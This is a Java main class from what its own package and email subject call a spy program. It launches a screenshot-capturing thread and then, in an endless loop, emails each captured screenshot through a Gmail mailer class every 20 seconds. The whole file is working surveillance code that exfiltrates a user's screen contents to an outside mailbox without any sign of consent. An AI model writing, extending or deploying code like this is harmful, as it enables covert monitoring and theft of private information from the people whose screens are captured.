import SpyCode.SendMail.GMailer;
import Threads.PrntScreenThread;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class Main extends PrntScreenThread {

    static PrntScreenThread threadOfPrntScreenClass;

    public static void main(String[] args) throws Exception {

        threadOfPrntScreenClass = new PrntScreenThread();
        Thread prntScreenThread = new Thread(threadOfPrntScreenClass);

        GMailer gmailer = new GMailer();
        int countOfNames = 0;

        prntScreenThread.start();
        Thread.sleep(20000);

        for (; ; ) {
            File file = new File(threadOfPrntScreenClass.listOfScreenshots.get(countOfNames));
            gmailer.sendMail("SpyProgram subject", " ", file);
            try {
                Thread.sleep(20000);
                countOfNames++;
            } catch (Exception e) {
                System.out.println("Exception: " + e);
            }
        }

    }
}
